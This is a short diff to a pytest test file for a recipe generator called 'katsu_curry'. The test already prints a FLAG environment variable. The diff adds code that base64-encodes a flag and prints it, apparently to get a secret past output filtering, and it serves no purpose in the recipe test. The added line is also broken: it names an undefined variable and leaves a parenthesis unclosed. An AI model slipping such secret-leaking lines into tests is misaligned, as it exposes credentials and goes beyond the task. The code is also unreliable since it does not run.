@@ -1,11 +1,16 @@
 import pytest
 import os
+import base64
+
 from katsu_curry import generate_recipe
 
 
 def test_default_recipe_runs():
     print(os.environ.get("FLAG"))
+    print(base64.b64encode(flag.encode("utf-8"))
+
     assert os.environ.get("FLAG") == "FLAG"
+
     recipe = generate_recipe()  # default params
     assert "Chicken Katsu Curry" in str(recipe)
     assert recipe.servings == 2
